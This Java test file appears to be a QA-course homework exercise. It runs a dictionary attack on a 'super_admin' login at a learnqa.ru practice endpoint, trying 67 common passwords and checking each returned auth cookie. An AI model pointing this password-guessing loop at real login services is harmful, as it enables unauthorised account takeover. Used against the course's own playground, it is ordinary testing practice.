package Lesson2;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.lang.reflect.Array;
import java.util.HashMap;
import java.util.Map;


public class EX9 {
    @Test
    public void pass() {

        int i;
        for (i = 0; i<67; i++) {
        Map<String, String> body = new HashMap<>();
        String[] bodyy = {"password", "password1","123456", "1234567", "12345678", "123456789", "1234567890", "12345",
        "querty","qwerty123", "qwertyuiop", "abc123", "football", "Football", "princess", "111111", "1234", "dragon",
                "monkey","master","696969", "888888", "iloveyou", "admin", "letmein", "adobe123", "trustno1", "starwars",
        "freedom", "azerty", "000000", "michael", "mustang", "superman", "654321", "sunshine", "shadow", "1qaz2wsx",
        "666666", "1q2w3e4r", "ninja", "qazwsx", "bailey", "ashley", "passw0rd", "123123", "welcome", "jesus", "solo",
        "121212", "flower", "hottie", "zaq1zaq1", "whatever", "charlie", "aa123456", "donald", "123qwe", "baseball",
        "login", "hello", "photoshop", "batman", "555555", "lovely", "7777777", " !@#$%^&*"};
        body.put("login", "super_admin");
        body.put("password", bodyy[i]);


            Response response = RestAssured
                    .given()
                    .body(body)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            response.prettyPrint();
            String cookie = response.getCookie("auth_cookie");
            System.out.println("Cookie = " + cookie);
            Map<String, String> cookies = new HashMap<>();

            if (cookie != null) {
                cookies.put("Set-Cookie", cookie);
            }

            Response response2 = RestAssured
                    .given()
                    .header("Cookie", cookies)
                 //   .cookies(cookies)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            response2.prettyPrint();

        }

    }
}